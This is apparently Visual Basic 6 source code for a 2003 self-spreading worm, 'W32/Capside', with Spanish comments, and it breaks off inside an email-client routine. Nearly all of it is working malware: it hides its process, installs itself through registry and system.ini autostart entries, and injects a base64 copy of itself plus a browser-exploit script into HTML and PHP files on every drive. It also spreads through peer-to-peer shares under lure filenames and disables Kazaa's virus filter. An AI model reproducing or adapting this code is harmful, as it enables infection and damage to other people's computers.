   VERSION 5.00
   Begin VB.Form Form1
      Caption         =   "Form1"
      ClientHeight    =   930
      ClientLeft      =   60
      ClientTop       =   345
      ClientWidth     =   1560
      Icon            =   "Form1.frx":0000
      LinkTopic       =   "Form1"
      ScaleHeight     =   930
      ScaleWidth      =   1560
      StartUpPosition =   3  'Windows Default
      Visible         =   0   'False
      Begin VB.Timer Timer1
         Interval        =   10000
         Left            =   360
         Top             =   240
      End
   End
   Attribute VB_Name = "Form1"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   'Declaramos las apis para leer y escribir en archivos ini,
   'para obtener nuestro proceso y reggistrarlo.
   'y las constantes
   Private Declare Function GetPrivateProfileString Lib "Kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
   Private Declare Function WritePrivateProfileString Lib "Kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
   Private Declare Function GetCurrentProcessId Lib "Kernel32" () As Long
   Private Declare Function RegisterServiceProcess Lib "Kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
   Const RSP_SIMPLE_SERVICE = 1
   Const RSP_UNREGISTER_SERVICE = 0

   'Declaramos variables
   Dim Cf, Cw, Cd, CodeCapsideB64, CodeScript1, CodeScript2
   Private Sub Form_Load()

   'Empiezo este virus, agradeciendo a Dios, mi familia
   'y a todas aquellas personas que aportaron algo, para ayudarme
   'en uno de los momentos más dificiles de mi vida.

   '<**********GEDZAC LABS 2003**********>
   'W32/Capside.worm By MachineDramon/GEDZAC
   'Hecho en el Perú, Calidad Mundial
   '03-04-2003  -  San Pedro de Tacna, Antes Valle del Takana
   'sachiel2015@latinmail.com
   'Worm De Concepto
   'Derechos Reservados

   'Expresando el repudio a la guerra emprendida por el asesino
   'de Bush

   '---------------------------------------------------------


   On Error Resume Next
   'llamamos al sub HideProcess, para escondernos del
   'Ctrl+atl+supr
   HideProcess

   'creamos un diccionario y le añadimos las extenciones de los
   'archivos que infectaremos
   Set Cd = CreateObject("Scripting.Dictionary")
   Cd.Add "html", 1: Cd.Add "htm", 2
   Cd.Add "php", 4: Cd.Add "asp", 5: Cd.Add "shtml", 6
   Cd.Add "shtm", 7: Cd.Add "phtml", 8: Cd.Add "phtm", 9
   Cd.Add "plg", 11: Cd.Add "htx", 12: Cd.Add "mht", 13: Cd.Add "mhtml", 14

   'Creamos Scripting.FileSystemObject y WScript.Shell
   Set Cf = CreateObject("Scripting.FileSystemObject")
   Set Cw = CreateObject("WScript.Shell")

   'obtenemos el codigo en base64 del virus
   CodeCapsideB64 = B64(Sp(0) & "\Capside.exe")

   'es parte del code que se insertara en los archivos infectados
   CodeScript1 = "MIME-Version: 1.0" & vbCrLf & _
   "Content-Location:file:///Capside.exe" & vbCrLf & _
   "Content-Transfer-Encoding: base64" & vbCrLf & _
   CodeCapsideB64 & vbCrLf & _
   "<Script Language = 'VBScript'>" & vbCrLf

   CodeScript2 = vbCrLf & "id = setTimeout(" & Chr(34) & "IEB()" & Chr(34) & ", 150)" & vbCrLf & _
   "Sub IEB()" & vbCrLf & _
   "Vpt = LCase(Document.url)" & vbCrLf & _
   "Vtx=" & Chr(34) & "<object style=$cursor:cross-hair$ classid=$clsid:22222222-2222-2222-2222$  CODEBASE=$mhtml:" & Chr(34) & "&Vpt&" & Chr(34) & "!file:///Capside.exe$></object>" & Chr(34) & vbCrLf & _
   "Vtx = Replace(Vtx, " & Chr(34) & "$" & Chr(34) & ", Chr(34)): Document.Write (Vtx) & vbCrLf & Capside" & vbCrLf & _
   "End Sub" & vbCrLf & _
   "Function Ec(code)" & vbCrLf & _
   "For i = 1 To Len(code)" & vbCrLf & _
   "Ck = Asc(Mid(code, i, 1))" & vbCrLf & _
   "If Ck = Asc(" & Chr(34) & "¥" & Chr(34) & ") Then" & vbCrLf & _
   "Ec = Ec & " & Chr(34) & "%" & Chr(34) & vbCrLf & _
   "ElseIf Ck = 28 Then" & vbCrLf & _
   "Ec = Ec & Chr(13)" & vbCrLf & _
   "ElseIf Ck = 29 Then" & vbCrLf & _
   "Ec = Ec & Chr(10)" & vbCrLf & _
   "Else" & vbCrLf & _
   "Ec = Ec & Chr(Ck Xor 7)" & vbCrLf & _
   "End If" & vbCrLf & _
   "Next" & vbCrLf & _
   "End Function" & vbCrLf & _
   "</Script>"

   'si no existe CapsideCode.htm , infectamos
   If Not (Cf.FileExists(Sp(0) & "\CapsideCode.htm")) Then
   Call Infeccion
   Else
   Call Latencia
   End If
   End Sub

   'Para registrar nuestro servicio y escondernos de
   'ctrl+alt+supr
   Sub HideProcess()
   On Error Resume Next
   Dim H As Long
   H = RegisterServiceProcess(GetCurrentProcessId(), RSP_SIMPLE_SERVICE)
   End Sub

   Sub Infeccion()
   On Error Resume Next

   MsgBox "!Por Cristo he sido salvado¡"

   'creamos CapsideCode.htm
   Set c = Cf.CreateTextFile(Sp(0) & "\CapsideCode.htm")
   c.write CodeScript1 & CodeScript2
   c.Close

   'obtenemos un nombre aleatorio
   Rn = RndN()

   'si existe borramos capside.exe
   Cf.DeleteFile (Sp(0) & "\Capside.exe")

   'nos copiamos como capside.exe y como NombreAleatorio.scr
   FileCopy Sp(3), Sp(0) & "\Capside.exe"
   FileCopy Sp(3), Sp(1) & "\" & Rn & ".scr"

   'les damos atributos de oculto y sistema
   SA Sp(0) & "\Capside.exe", 6: SA Sp(1) & "\" & Rn & ".scr", 6

   'activamos la copia con nombre aleatorio
   Cw.Run Sp(1) & "\" & Rn & ".scr"

   'escribimos en el registro y en el system.ini para ejecutarnos
   'al inicio de la pc
   Rw "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\W32Load", Sp(1) & "\" & Rn & ".scr", ""
   WIni "boot", "shell", "Explorer.exe " & Sp(0) & "\Capside.exe", Sp(0) & "\System.ini"

   End Sub

   Sub Latencia()
   On Error Resume Next

   'creamos CapsideCode.htm
   Set c = Cf.CreateTextFile(Sp(0) & "\CapsideCode.htm")
   c.write CodeScript1 & CodeScript2
   c.Close

   'llamamos a los procedimientos
   Call Vfirmas
   Call VP2P
   Call VDisk
   End Sub

   'Sub para verificar la existencia de programas p2p
   'instalados en la pc, de encontralos activa el procedimiento
   'correspondiente
   Sub VP2P()
   On Error Resume Next

   IsD = Rr("HKEY_LOCAL_MACHINE\SOFTWARE\BearShare\InstallDir")
   If IsD <> "" Then
   VBear IsD
   End If

   IsD = Rr("HKEY_LOCAL_MACHINE\SOFTWARE\KAZAA\CloudLoad\ExeDir")
   If IsD <> "" Then
   VKazaa
   End If

   IsD = Rr("HKEY_LOCAL_MACHINE\SOFTWARE\mscrp\morpheushome")
   If IsD <> "" Then
   VMorpheus IsD
   End If

   IsD = Rr("HKEY_LOCAL_MACHINE\Software\Mirabilis\ICQ\Install\General\InstalledDir")
   If IsD <> "" Then
   VIcq IsD
   End If

   IsD = Rr("HKEY_LOCAL_MACHINE\Software\CLASSES\ed2k\DefaultIcon\")
   If IsD <> "" Then
   VEdonkey IsD
   End If

   IsD = Rr("HKEY_CLASSES_ROOT\ftopia\shell\open\command\")
   If IsD <> "" Then
   VFiletopia IsD
   End If

   IsD = Rr("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\Grokster\UninstallString")
   If IsD <> "" Then
   VGrokster IsD
   End If

   IsD = Rr("HKEY_LOCAL_MACHINE\Software\iMesh\Client\ProgramLocation")
   If IsD <> "" Then
   VImesh
   End If

   IsD = Rr("HKEY_LOCAL_MACHINE\Software\LimeWire\InstallDir")
   If IsD <> "" Then
   VLimewire
   End If

   IsD = Rr("HKEY_CURRENT_USER\Software\FileNavigator_26\DownloadDirectory")
   If IsD <> "" Then
   VSwaptor IsD
   End If

   IsD = Rr("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\Gnucleus\UninstallString")
   If IsD <> "" Then
   VGnucleus IsD
   End If

   IsD = Rr("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\Overnet\UninstallString")
   If IsD <> "" Then
   VOverNet IsD
   End If

   IsD = Rr("HKEY_CURRENT_USER\Software\SoulSeek\InstallPath")
   If IsD <> "" Then
   VSoulSeek IsD
   End If

   End Sub

   'Sub para obtener la ruta del folder compartido de Imesh
   Sub VImesh()
   On Error Resume Next
   Rg = "HKEY_CURRENT_USER\Software\iMesh\Client\LocalContent\"
   Rg0 = Right(Rr(Rg & "Dir0"), Len(Rr(Rg & "Dir0")) - 7) & "\"
   Rg1 = Right(Rr(Rg & "Dir1"), Len(Rr(Rg & "Dir1")) - 7) & "\"
   InfectP2P Rg0
   InfectP2P Rg1
   End Sub

   'Sub para obtener la ruta del folder compartido de Limewire
   Sub VLimewire()
   On Error Resume Next
   Set Cf = CreateObject("Scripting.filesystemobject")
   Set Lp = Cf.OpenTextFile(Cf.GetSpecialFolder(0) & "\.limewire\limewire.props")
   Do While Lp.AtendOfStream = False
   Ll = Lp.Readline
   If InStr(Ll, "DIRECTORIES_TO_SEARCH_FOR_FILES=") <> 0 Then
   Ln = InStr(Ll, "="): Ll = Mid(Ll, Ln + 1)
   Ll = Replace(Ll, "\\", "\"): Ll = Replace(Ll, "\:", ":\"): Ll = Replace(Ll, "\\", "\")
   If Right(Ll, 1) = ";" Then Ll = Mid(Ll, 1, Len(Ll) - 1)
   Lm = Split(Ll, ";")
   For i = 0 To UBound(Lm)
   InfectP2P Lm(i) & "\"
   Next
   End If
   Loop
   Lp.Close
   End Sub

   'Sub paraobtener la ruta del folder compartido de BearShare
   Sub VBear(Xd)
   On Error Resume Next
   Set l = Cf.OpenTextFile(Xd & "\db\library.dat")
   Do While l.AtendOfStream = False
   J = J & l.Readline
   Loop
   l.Close
   Jb = J: J = Mid(J, 17): n2 = InStr(J, Chr(1)): J = Mid(J, 1, n2 - 4): Jm = Split(J, Chr(15))
   If UBound(Jm) >= 1 Then
   J0 = Jm(0): J1 = Mid(Jm(UBound(Jm)), 4, Len(Jm(UBound(Jm))) - 4): n3 = InStr(J1, Chr(9))
   If n3 <> 0 Then J1 = Mid(J1, 1, n3 - 1)
   If Right(J0, 1) <> "\" Then J0 = J0 & "\"
   If Right(J1, 1) <> "\" Then J1 = J1 & "\"
   Else
   Jb = Mid(Jb, 17): b1 = InStr(Jb, Chr(1)): J0 = Mid(Jb, 1, b1 - 1) & "\"
   End If
   InfectP2P J0: InfectP2P J1
   InfectP2P ("c:\My Downloads\")
   End Sub

   'Sub para obtener la ruta del folder compartido de Kazaa
   Sub VKazaa()
   On Error Resume Next
   Rw "HKEY_CURRENT_USER\Software\KAZAA\LocalContent\DisableSharing", 0, "REG_DWORD"
   Rw "HKEY_CURRENT_USER\Software\KAZAA\ResultsFilter\virus_filter", 0, "REG_DWORD"
   Rw "HKEY_CURRENT_USER\Software\KAZAA\ResultsFilter\firewall_filter", 0, "REG_DWORD"
   Xd = Rr("HKEY_CURRENT_USER\Software\KAZAA\LocalContent\Dir0")
   Sf = Right(Xd, Len(Xd) - 7) & "\"
   InfectP2P (Sf)
   Xd = Rr("HKEY_LOCAL_MACHINE\SOFTWARE\KAZAA\CloudLoad\ShareDir")
   Sf = Xd
   InfectP2P (Sf & "\")
   End Sub

   'Sub para obtener la ruta del folder compartido de Morpheus
   Sub VMorpheus(Xd)
   On Error Resume Next
   Set Sh = Cf.OpenTextFile(Xd & "\share.cfg")
   Do While Sh.AtendOfStream = False
   H = Sh.Readline
   If InStr(H, "localhostt") <> 0 Then
   Exit Do
   End If
   Loop
   Sh.Close
   C1 = InStr(H, "localhostt")
   H = Right(H, Len(H) - (C1 + 11))
   For i = Len(H) To 1 Step -1
   M = M & Mid(H, i, 1)
   Next
   C2 = InStr(M, "5%")
   H = Right(M, Len(M) - (C2 + 1))
   For x = Len(H) To 1 Step -1
   k = k & Mid(H, x, 1)
   Next
   D1 = Left(k, 1)
   k = Right(k, Len(k) - 7)
   Df = "\" & k
   Df = Replace(Df, "%5C", "\")
   Sf = D1 & ":" & Df
   Sf = Replace(Sf, "+", Space(1)) & "\"
   InfectP2P (Sf)
   Sf = Xd & "\My Shared Folder\"
   InfectP2P (Sf)
   Set F = Nothing
   End Sub

   'Sub para obtener la ruta del folder compartido de Icq
   Sub VIcq(Xd)
   On Error Resume Next
   InfectP2P (Xd & "\shared files\")
   End Sub

   'Sub para obtener la ruta del folder compartido de Grokster
   Sub VGrokster(Xd)
   On Error Resume Next
   Sf = Left(Xd, Len(Xd) - 14): Sf = Sf & "\My Grokster\"
   InfectP2P (Sf)
   Sf = Rr("HKEY_CURRENT_USER\Software\Grokster\LocalContent\Dir0")
   Sf = Right(Sf, Len(Sf) - 7) & "\"
   InfectP2P (Sf)
   End Sub

   'Sub para obtener la ruta del folder compartido de Edonkey
   Sub VEdonkey(Xd)
   On Error Resume Next
   Dim E As String: Dim F
   E = Mid(Xd, 2)
   E = Left(E, Len(E) - 16)
   Set D = Cf.OpenTextFile(E & "share.dat")
   Do While D.AtendOfStream <> True
   Sn = Sn & D.Readline & vbCrLf
   DoEvents
   Loop
   D.Close
   s = Split(Sn, Chr(18))
   If UBound(s) >= 1 Then
   InfectP2P Mid(s(0), 3) & "\"
   V = InStrRev(s(UBound(s)), ":")
   a = Mid(s(1), V - 1)
   a = Mid(a, 1, Len(a) - 2) & "\"
   InfectP2P a
   Else
   InfectP2P Mid(s(0), 3, Len(s(0)) - 4) & "\"
   End If
   Set F = Nothing
   End Sub

   'Sub para obtener la ruta del folder compartido de Filetopia
   Sub VFiletopia(Xd)
   On Error Resume Next: Dim E, Sf As String
   E = Left(Xd, Len(Xd) - 16)
   If Dir(E & "Filetopia.INI") <> "" Then
   Sf = IniR("ServerInclude", "1", E & "Filetopia.INI"): InfectP2P Sf
   Sf = IniR("ServerInclude", "2", E & "Filetopia.INI"): InfectP2P Sf
   Sf = IniR("Settings", "DownloadPath", E & "Filetopia.INI"): InfectP2P Sf
   End If
   End Sub

   'Sub para obtener la ruta del folder compartido de Swaptor
   Sub VSwaptor(Xd)
   On Error Resume Next
   Sw1 = Mid(Xd, 1, Len(Xd) - 8) & "Share\"
   Sw2 = Rr("HKEY_CURRENT_USER\Software\FileNavigator_26\SharedDirectories\0") & "\"
   InfectP2P Sw1: InfectP2P Sw2
   End Sub

   'Sub para obtener la ruta del folder compartido de Gnucleus
   Sub VGnucleus(Xd)
   On Error Resume Next
   Gnp = Mid(Xd, 2, Len(Xd) - 17)
   Gn1 = IniR("Share", "Dir0", Gnp & "GnuConfig.ini"): Gn1 = Mid(Gn1, 1, Len(Gn1) - 11) & "\"
   Gn2 = IniR("Share", "Dir1", Gnp & "GnuConfig.ini"): Gn2 = Mid(Gn2, 1, Len(Gn2) - 11) & "\"
   InfectP2P Gn1: InfectP2P Gn2
   End Sub

   'Sub para obtener la ruta del folder compartido de Overnet
   Sub VOverNet(Xd)
   On Error Resume Next
   On1 = Mid(Xd, 2, Len(Xd) - 23)
   Set On2 = Cf.OpenTextFile(On1 & "Share.dat")
   On3 = Mid(On2.ReadAll, 3)
   On2.Close
   On4 = Split(On3, Chr(18))
   If UBound(On4) Mod 2 = 0 Then
   O1 = On4(0)
   O2 = Mid(On4(UBound(On4)), 2)
   InfectP2P O1
   InfectP2P O2
   ElseIf UBound(On4) Mod 2 <> 0 Then
   O1 = On4(0)
   O2 = Mid(On4(UBound(On4)), InStr(On4(UBound(On4)), Chr(9)) + 2)
   InfectP2P O1
   InfectP2P O2
   Else
   InfectP2P On3
   End If
   End Sub

   'Sub para obtener la ruta del folder compartido de SoulSeek
   Sub VSoulSeek(Xd)
   On Error Resume Next
   Set k1 = Cf.OpenTextFile(Xd & "\shared.cfg")
   Do While k1.AtendOfStream = False
   k2 = k1.ReadAll
   Loop
   k1.Close
   k2 = Mid(k2, 9, Len(k2) - 14): k2 = Mid(k2, InStr(k2, ":") - 1)
   InfectP2P k2 & "\"
   End Sub

   'Sub para copiar el worm a los folderes compartidos de
   'los programas p2p
   Sub InfectP2P(Xd)
   On Error Resume Next
   If Len(Xd) >= 3 Then
   If Right(Xd, 1) <> "\" Then Xd = Xd & "\"
   For Each i In P2PName()
   If Dir(Xd & i) = "" Then
   FileCopy Sp(0) & "\CapsideCode.htm", Xd & i
   End If
   Next

   For Each w In LFiles(Xd)
   If Dir(Xd & w & ".html") = "" Then
   If w <> "" Then
   FileCopy Sp(0) & "\CapsideCode.htm", Xd & w & ".html"
   End If
   End If
   Next

   End If
   End Sub

   'Sub que obtiene los nombres de los archivos que estan en los
   'folderes compartidos de los programas p2p
   Function LFiles(XDir)
   On Error Resume Next
   Dim Xf, Xfs, x()
   Set Xf = Cf.GetFolder(XDir): Set Xfs = Xf.Files
   ReDim x(1 To (Xf.Files.Count)): a = 1
   For Each k In Xfs
   Ex = LCase(Cf.GetExtensionName(k.Path))
   If (Ex <> "html") And (Ex <> "htm") And (Ex <> "plg") Then
   x(a) = k.Name: a = a + 1
   End If
   Next: Set F = Nothing: LFiles = x
   End Function

   'Funcion que contiene los nombres con que se copiara el worm
   'dentro de los folderes compartidos.
   Function P2PName()
   On Error Resume Next
   P = Array("Ana Kournikova Sex Video.html", "AVP Antivirus Pro Key Crack.html", "Britney Spears Sex Video.html", "Buffy Vampire Slayer Movie.html", _
   "Crack Passwords Mail.html", "Cristina Aguilera Sex Video.html", "Game Cube Real Emulator.html", "Hentai Anime Girls Movie.html", "Jenifer Lopez Sex Video.html", _
   "Matrix Movie.html", "Mcafee Antivirus Scan Crack.html", "Norton Anvirus Key Crack.html", "Panda Antivirus Titanium Crack.html", "PS2 PlayStation Simulator.html", _
   "Quick Time Key Crack.html", "Sakura Card Captor Movie.html", "Sex Live Simulator.html", "Sex Passwords.html", "Spiderman Movie.html", "Start Wars Trilogy Movies.html", _
   "Thalia Sex Video.html", "Winzip KeyGenerator Crack.html ", "aol cracker.html", "aol password cracker.html", "divx pro.html", "GTA 3 Crack.html", "GTA 3 Serial.html", _
   "play station emulator.html", "virtua girl - adriana.plg", "virtua girl - bailey short skirt.plg", "Virtua Girl (Full).html", "warcraft 3 crack.html", "warcraft 3 serials.plg", _
   "counter-strike.html", "delphi.html", "divx_pro.html", "HotGirls.html", "hotmail_hack.html", "pamela_anderson.htm", "serials2000.html", "subseven.html", "VB6.html", "VirtualSex.html", _
   "ACDSee 5.5.html", "Age of Empires 2 crack.html", "Animated Screen 7.0b.html", "AOL Instant Messenger.html", "AquaNox2 Crack.html", "Audiograbber 2.05.html", "BabeFest 2003 ScreenSaver 1.5.html", _
   "Babylon 3.50b reg_crack.html", "Battlefield1942_bloodpatch.html", "Battlefield1942_keygen.html", "Business Card Designer Plus 7.9.html", "Clone CD 5.0.0.3 (crack).html", "Clone CD 5.0.0.3.html", _
   "Coffee Cup Free HTML 7.0b.html", "Cool Edit Pro v2.55.html", "Diablo 2 Crack.html", "DirectDVD 5.0.html", "DirectX Buster (all versions).html", "DirectX InfoTool.html", "DivX Video Bundle 6.5.html", _
   "Download Accelerator Plus 6.1.html", "DVD Copy Plus v5.0.html", "DVD Region-Free 2.3.html", "FIFA2003 crack.html", "Final Fantasy VII XP Patch 1.5.html", "Flash MX crack (trial).html", "FlashGet 1.5.html", _
   "FreeRAM XP Pro 1.9.html", "GetRight 5.0a.html", "Global DiVX Player 3.0.html", "Gothic2 licence.html", "Guitar Chords Library 5.5.html", "Hitman_2_no_cd_crack.html", "Hot Babes XXX Screen Saver.html", _
   "ICQ Pro 2003a.html", "ICQ Pro 2003b (new beta).html", "iMesh 3.6.html", "iMesh 3.7b (beta).html", "IrfanView 4.5.html", "KaZaA Hack 2.5.0.html", "KaZaA Speedup 3.6.html", "Links 2003 Golf game (crack).html", _
   "Living Waterfalls 1.3.html", "Mafia_crack.html", "Matrix Screensaver 1.5.html", "MediaPlayer Update.html", "mIRC 6.40.html", "mp3Trim PRO 2.5.html", "MSN Messenger 5.2.html", "NBA2003_crack.html", _
   "Need 4 Speed crack.html", "Nero Burning ROM crack.html", "Netfast 1.8.html", "Network Cable e ADSL Speed 2.0.5.html", "NHL 2003 crack.html", "Nimo CodecPack (new) 8.0.html", "PalTalk 5.01b.html", _
   "Popup Defender 6.5.html", "Pop-Up Stopper 3.5.html", "QuickTime_Pro_Crack.html", "Serials 2003 v.8.0 Full.html", "SmartFTP 2.0.0.html", "SmartRipper v2.7.html", "Space Invaders 1978.html", _
   "Splinter_Cell_Crack.html", "Steinberg_WaveLab_5_crack.html", "Trillian 0.85 (free).html", "TweakAll 3.8.html", "Unreal2_bloodpatch.html", "Unreal2_crack.html", "UT2003_bloodpatch.html", _
   "UT2003_keygen.html", "UT2003_no cd (crack).html", "UT2003_patch.html", "WarCraft_3_crack.html", "Winamp 3.8.html", "WindowBlinds 4.0.html", "WinOnCD 4 PE_crack.html", "WinZip 9.0b.html", _
   "Yahoo Messenger 6.0.html", "Zelda Classic 2.00.html", "Windows XP complete + serial.html", "Screen saver christina aguilera.html", "Screen saver christina aguilera naked.html", "Visual basic 6.html", _
   "Starcraft serial.html", "Credit Card Numbers generator(incl Visa,MasterCard,...).html", "Edonkey2000-Speed me up scotty.html", "Hotmail Hacker 2003-Xss Exploit.html", "Kazaa SDK + Xbit speedUp for 2.xx.html", _
   "Microsoft KeyGenerator-Allmost all microsoft stuff.html", "Netbios Nuker 2003.html", "Security-2003-Update.html", "Stripping MP3 dancer+crack.html", "Visual Basic 6.0 Msdn Plugin.html", "Windows Xp Exploit.html", _
   "WinRar 3.xx Password Cracker.html", "WinZipped Visual C++ Tutorial.html", "XNuker 2003 2.93b.html", "cable modem ultility pack.html", "macromedia dreamweaver key generator.htm", "winamp plugin pack.html", _
   "winzip full version key generator.htm")

   P2PName = P
   End Function

   'Sub que lista los discos duros y de red del sistema
   Sub VDisk()
   On Error Resume Next
   Set Vd = Cf.Drives
   For Each Vdt In Vd
   If (Vdt.DriveType = 2) Or (Vdt.DriveType = 3) Then
   VFolder Vdt.Path & "\"
   End If
   Next
   End Sub

   'Sub que lista los folderes del sistema
   Sub VFolder(F)
   On Error Resume Next
   Set Cfl = Cf.GetFolder(F)
   Set Cfs = Cfl.Subfolders
   For Each Fl In Cfs
   VFiles Fl.Path
   VFolder Fl.Path
   Next
   End Sub

   'Sub que lista los archivos y busca archivos html,htm, php,
   'para infectar.
   Sub VFiles(F)
   On Error Resume Next
   Set fls = Cf.GetFolder(F)
   Set Fs = fls.Files
   For Each Fh In Fs
   Fx = LCase(Cf.GetExtensionName(Fh.Path))
   Fn = LCase(Fh.Name)

   If Cd.Exists(Fx) = True Then
   CodeH (Fh.Path)

   ElseIf (Fn = "win.ini") Then
   FileCopy Sp(0) & "\Capside.exe", F & "\CapsideRed.pif"
   WIni "windows", "run", F & "\CapsideRed.pif", Fh.Path

   End If
   Next
   End Sub

   'Sub para escribir en archivos ini
   Sub WIni(I_S As String, IK As String, IV As String, IP As String)
   On Error Resume Next
   Dim Wn As Long
   Wn = WritePrivateProfileString(I_S, IK, IV, IP)
   End Sub

   'Function que nos devuel las rutas de windows, system, temp
   'y la ruta del virus de acuerdo al numero que le pasemos
   '0,1,2,3 respectivamente
   Function Sp(x)
   On Error Resume Next
   Select Case x
   Case 0: Sp = Cf.GetSpecialFolder(0)
   Case 1: Sp = Cf.GetSpecialFolder(1)
   Case 2: Sp = Cf.GetSpecialFolder(2)
   Case 3
   Exn = App.Path
   If Right(Exn, 1) <> "\" Then Exn = Exn & "\"
   Exs = Array(".exe", ".com", ".pif", ".scr", ".bat")
   For i = 0 To 4
   If Dir(Exn & App.EXEName & Exs(i)) <> "" Then Sp = Exn & App.EXEName & Exs(i): Exit For
   Next
   End Select
   End Function

   'Sub para colocar atributos de solo lectura, oculto o sistema
   Sub SA(P, a)
   On Error Resume Next
   SetAttr P, a
   End Sub

   'Function que nos da un nombre de archivo aleatorio
   Function RndN()
   On Error Resume Next
   Randomize
   For i = 1 To 7
   r = Int(Rnd * 55) + 66: If r = 92 Then r = 96
   RndN = RndN & Chr(r)
   Next
   End Function

   'Sub para escribir en el registro
   Sub Rw(r, k, t)
   On Error Resume Next
   If t = "" Then Cw.RegWrite r, k Else Cw.RegWrite r, k, "REG_DWORD"
   End Sub

   'Function para leer el registro
   Function Rr(r)
   On Error Resume Next
   Rr = Cw.RegRead(r)
   End Function

   'Function para leer archivos ini
   Function IniR(NS, NK, ND)
   On Error Resume Next
   Dim k As String
   k = NK
   Dim St As String * 400
   Dim i As Long
       i = GetPrivateProfileString(NS, k, "", St, Len(St), ND)
   IniR = Left(St, i)
   End Function

   'Timer que llama al procedimiento para infectar disckets
   'cada 10min aprox.
   Private Sub Timer1_Timer()
   On Error Resume Next
   Static v1, v2 As Integer
   If v1 = 75 Then
   v1 = 1: Call VFloppy
   Else
   v1 = v1 + 1
   End If
   End Sub

   'Sub para copiarse a los diskets
   Sub VFloppy()
   On Error Resume Next
   Static XFile: Set Fd = Cf.Drives
   For Each FVs In Fd
   If FVs.DriveType = 1 Then

   If Cf.GetDrive(FVs.Path & "\").FreeSpace < 100000 Then Exit Sub

   TempFile = Dir(FVs.Path & "\*.*")

   t = Cf.GetExtensionName(FVs.Path & "\*.*")

   If (TempFile <> "") And (XFile <> TempFile) Then

   t = LCase(Right(TempFile, 3))

   If (t <> "htm") And (t <> "tml") And (t <> "plg") Then

   Bn = Cf.GetBaseName(TempFile)
   FileCopy Sp(0) & "\CapsideCode.htm", FVs.Path & "\" & Bn & ".htm"
   SA FVs.Path & "\" & TempFile, 6

   End If
   XFile = TempFile

   Else

   Rf = Array("Capside.htm", "Avril Lavigne.html", "Institucional.plg", "Bendicion.html", "LosOtros.htm")
   Randomize: Ry = Int(Rnd * 4)
   If Not (Cf.FileExists(FVs.Path & "\" & Rf(Ry))) Then
   FileCopy Sp(0) & "\CapsideCode.htm", FVs.Path & "\" & Rf(Ry)
   End If
   End If
   End If
   Next
   End Sub

   'Sub para infectar archivos html, htm, php, etc
   Sub CodeH(rp)
   On Error Resume Next

   Set H1 = Cf.OpenTextFile(rp)
   Hr1 = H1.Readline
   If InStr(Hr1, "MIME") <> 0 Then
   H1.Close
   Exit Sub
   Else
   Hr2 = H1.ReadAll: H1.Close
   End If

   For i = 1 To Len(Hr2)
   Ck = Asc(Mid(Hr2, i, 1))
   If Ck = Asc("%") Then
   Ec = Ec & "¥"
   ElseIf Ck = 13 Then
   Ec = Ec & Chr(28)
   ElseIf Ck = 10 Then
   Ec = Ec & Chr(29)
   Else
   Ec = Ec & Chr(Ck Xor 7)
   End If
   Next

   Ec = "Capside = Ec(" & Chr(34) & Ec & Chr(34) & ")"

   Set H2 = Cf.OpenTextFile(rp, 2, 1)
   H2.write CodeScript1 & Ec & CodeScript2
   H2.Close


   End Sub

   'Function para obtener el code en base64 del virus
   Public Function B64(ByVal vsFullPathname)
   On Error Resume Next
   Dim b           As Integer: Dim Base64Tab  As Variant
   Dim bin(3)      As Byte: Dim s, sResult As String: Dim l, i, FileIn, n As Long

   Base64Tab = Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/")

   Erase bin: l = 0: i = 0: FileIn = 0: b = 0: s = "": FileIn = FreeFile

   Open vsFullPathname For Binary As FileIn
   sResult = s & vbCrLf: s = "": l = LOF(FileIn) - (LOF(FileIn) Mod 3)
   For i = 1 To l Step 3

   Get FileIn, , bin(0): Get FileIn, , bin(1): Get FileIn, , bin(2)

   If Len(s) > 64 Then
   s = s & vbCrLf: sResult = sResult & s: s = ""
   End If

   b = (bin(n) \ 4) And &H3F: s = s & Base64Tab(b)
   b = ((bin(n) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
   s = s & Base64Tab(b): b = ((bin(n + 1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
   s = s & Base64Tab(b): b = bin(n + 2) And &H3F: s = s & Base64Tab(b)
   Next i

   If Not (LOF(FileIn) Mod 3 = 0) Then
   For i = 1 To (LOF(FileIn) Mod 3)
   Get FileIn, , bin(i - 1)
   Next i
   If (LOF(FileIn) Mod 3) = 2 Then
   b = (bin(0) \ 4) And &H3F: s = s & Base64Tab(b)
   b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
   s = s & Base64Tab(b): b = ((bin(1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
   s = s & Base64Tab(b): s = s & "="
   Else
   b = (bin(0) \ 4) And &H3F: s = s & Base64Tab(b)
   b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
   s = s & Base64Tab(b): s = s & "=="
   End If
   End If

   If s <> "" Then
   s = s & vbCrLf: sResult = sResult & s
   End If
   s = ""
   Close FileIn: B64 = sResult
   End Function

   'Sub para configurar el Outlook express y el Microssoft outlook
   'para que envien como fondo de mensage un archivo html infectado
   Sub Vfirmas()
   On Error Resume Next
   Dim Ov(1)
   Us = Rr("HKEY_CURRENT_USER\Identities\Default User ID")
   Ov(0) = "5.0": Ov(1) = Left(Rr("HKEY_LOCAL_MACHINE\Software\Microsoft\Outlook Express\MediaVer"), 1) & ".0"
   Rout = "HKEY_CURRENT_USER\Identities\" & Us & "\Software\Microsoft\Outlook Express\"
   For i = 0 To UBound(Ov)
